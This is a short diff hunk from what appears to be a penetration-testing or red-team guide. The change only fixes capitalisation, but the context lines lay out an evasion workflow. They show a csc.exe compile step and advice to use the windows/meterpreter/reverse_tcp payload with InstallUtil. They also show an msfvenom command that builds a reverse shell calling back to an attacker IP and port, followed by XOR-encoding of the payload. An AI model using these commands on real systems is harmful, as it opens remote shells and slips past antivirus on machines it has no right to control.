@@ -6,7 +6,7 @@ C:\Users\dhanush\Desktop>c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe c
 
 # ** HOST it in the Linux attacker machine**
 
-# ✔️ ** use only windows/meterpreter/reverse_tcp payload in this ,x64 payloads dont work with InstallUtil**
+# ✔️ ** Use only windows/meterpreter/reverse_tcp payload in this ,x64 payloads dont work with InstallUtil**
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.130.136 LPORT=8999 -f raw > p.bin
 python3 xorenc.py pa.bin
